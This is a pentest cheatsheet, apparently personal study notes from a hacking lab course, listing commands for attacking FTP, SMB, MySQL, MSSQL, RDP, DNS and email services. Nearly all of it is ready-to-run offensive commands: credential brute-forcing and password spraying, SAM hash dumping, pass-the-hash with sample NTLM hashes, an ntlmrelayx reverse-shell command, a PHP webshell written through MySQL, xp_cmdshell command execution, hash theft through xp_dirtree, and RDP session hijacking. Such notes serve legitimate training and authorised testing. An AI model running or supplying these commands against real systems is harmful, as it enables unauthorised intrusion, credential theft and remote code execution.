
27-10-2025 12:17:20

Status:

Tags: [[cheatsheet]], [[ftp]], [[smb]], [[mysql]], [[MSSQL]]


# Attacking Services Cheatsheet

## Attacking FTP

**Connect to FTP server**

```
ftp 192.168.2.142
```

**Connect to FTP using netcat**

```
nc -v 192.168.2.142 21
```

**Brute-force FTP credentials**

```
hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142
```

---

## Attacking SMB

**Test null session**

```
smbclient -N -L //10.129.14.128
```

**Enumerate network shares**

```
smbmap -H 10.129.14.128
```

**Recursive share enumeration**

```
smbmap -H 10.129.14.128 -r notes
```

**Download file from share**

```
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

**Upload file to share**

```
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

**Connect with rpcclient (null session)**

```
rpcclient -U'%' 10.10.110.17
```

**Automated SMB enumeration**

```
./enum4linux-ng.py 10.10.11.45 -A -C
```

**Password spraying**

```
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'
```

**Connect using impacket-psexec**

```
impacket-psexec administrator:'Password123!'@10.10.110.17
```

**Execute command via SMB**

```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

**Enumerate logged-on users**

```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

**Extract SAM hashes**

```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

**Pass-the-Hash authentication**

```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

**Dump SAM with ntlmrelayx**

```
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

**Execute reverse shell with ntlmrelayx**

```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>'
```

---

## Attacking SQL Databases

### MySQL

**Connect to MySQL**

```
mysql -u julio -pPassword123 -h 10.129.20.13
```

**Show databases**

```
SHOW DATABASES;
```

**Select database**

```
USE htbusers;
```

**Show tables**

```
SHOW TABLES;
```

**Select all from users table**

```
SELECT * FROM users;
```

**Create webshell**

```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

**Check secure file privileges**

```
show variables like "secure_file_priv";
```

**Read local files**

```
select LOAD_FILE("/etc/passwd");
```

### MSSQL

**Connect to MSSQL**

```
sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30
```

**Connect from Linux**

```
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

**Connect with Windows authentication**

```
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

**Show databases**

```
SELECT name FROM master.dbo.sysdatabases
```

**Select database**

```
USE htbusers
```

**Show tables**

```
SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES
```

**Select all from users table**

```
SELECT * FROM users
```

**Enable advanced options**

```
EXECUTE sp_configure 'show advanced options', 1
```

**Enable xp_cmdshell**

```
EXECUTE sp_configure 'xp_cmdshell', 1
```

**Apply configuration changes**

```
RECONFIGURE
```

**Execute system command**

```
xp_cmdshell 'whoami'
```

**Read local files**

```
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

**Hash stealing with xp_dirtree**

```
EXEC master..xp_dirtree '\\10.10.110.17\share\'
```

**Hash stealing with xp_subdirs**

```
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

**Identify linked servers**

```
SELECT srvname, isremote FROM sysservers
```

**Query linked server**

```
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```

---

## Attacking RDP

**Password spraying with crowbar**

```
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

**Brute-force with hydra**

```
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

**Connect with rdesktop**

```
rdesktop -u admin -p password123 192.168.2.143
```

**Session hijacking - impersonate user**

```
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

**Start session hijack service**

```
net start sessionhijack
```

**Enable Restricted Admin Mode**

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

**Pass-the-Hash with xfreerdp**

```
xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA
```

---

## Attacking DNS

**Zone transfer attempt**

```
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

**Subdomain brute-forcing**

```
subfinder -d inlanefreight.com -v
```

**DNS lookup for subdomain**

```
host support.inlanefreight.com
```

---

## Attacking Email Services

**Find mail servers (host)**

```
host -t MX microsoft.com
```

**Find mail servers (dig)**

```
dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

**DNS lookup for mail server IP**

```
host -t A mail1.inlanefreight.htb.
```

**Connect to SMTP**

```
telnet 10.10.110.20 25
```

**SMTP user enumeration**

```
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

**Validate Office365 domain**

```
python3 o365spray.py --validate --domain msplaintext.xyz
```

**Enumerate Office365 users**

```
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

**Password spray Office365**

```
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

**Brute-force POP3**

```
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

**Test SMTP open-relay**

```
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
```


# References
- 